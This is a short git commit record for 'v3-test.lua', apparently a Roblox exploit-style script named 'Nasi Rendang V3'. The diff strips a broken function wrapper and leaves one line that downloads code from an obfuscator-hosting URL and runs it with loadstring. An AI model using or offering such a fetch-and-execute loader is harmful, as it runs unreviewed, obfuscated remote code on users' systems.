6fa4afe8556beb6087d87a5d4518e919d73dc644
JualNasiRendang <radikaradikaff@gmail.com>
2026-06-29 15:20:05 +0700

    Update v3-test.lua

--- v3-test.lua
+++ v3-test.lua
@@ -1,10 +1,1 @@
- function()
-        loadstring(game:HttpGet("https://obfuscatorhub.onrender.com/api/ncec8vbe"))()
-        if 
-            task.wait(.1)
-            Notify("Nasi Rendang V3", 3)
-        else
-            Notify("Nasi Rendang V3", 3)
-        end
-    end)
-
+loadstring(game:HttpGet("https://obfuscatorhub.onrender.com/api/ncec8vbe"))()
